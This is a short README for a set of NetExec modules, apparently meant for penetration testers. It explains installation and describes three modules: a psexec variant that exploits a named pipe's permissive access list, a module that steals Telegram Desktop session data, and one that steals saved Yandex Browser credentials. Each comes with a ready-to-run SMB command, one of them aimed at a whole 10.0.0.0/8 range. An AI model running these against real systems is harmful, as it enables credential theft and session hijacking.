# NetExec Modules
Other modules for NetExec from various authors

## Installation
If you have nxc installed via pipx, then put the modules on the path<br>
`~/.local/pipx/venvs/netexec/lib/python3.13/site-packages/nxc/modules/`

## List of modules
1. **psexec_noinstall.py**<br>
    *Description:* Using psexec_noinstall, it is possible to connect to this pipeline as any low-privileged user, since the DACL of the pipeline allows this.<br>
    *Example:*
   ```bash
   nxc smb 10.0.0.5 -u 'user' -p 'password' -M psexec_noinstall
   ```
    *References:*<br>
    https://github.com/MzHmO/psexec_noinstall<br>
    https://github.com/beaverdreamer/nxc-modules
2. **telegram.py**<br>
   *Description:* Stealing Telegram Desktop tdata to hijack a user's session.<br>
   *Example:*
   ```bash
   nxc smb 10.0.0.0/8 -u 'user' -p 'password' -M telegram
   ```
   Search tdata from DIR
   ```bash
   nxc smb 10.0.0.0/8 -u 'user' -p 'password' -M telegram -o SEARCH_DIR=c:\users\public
   ```
   *Reference:* https://github.com/CICADA8-Research/Penetration/tree/main/nxc%20modules
4. **yandex.py**<br>
   *Description:* Stealing creds from Yandex Browser.<br>
   *Example:*
   ```bash
   nxc smb 10.0.0.5 -u 'user' -p 'password' -M yandex
   ```
   *Reference:* https://github.com/voixe852/nxc_module_yandex
   
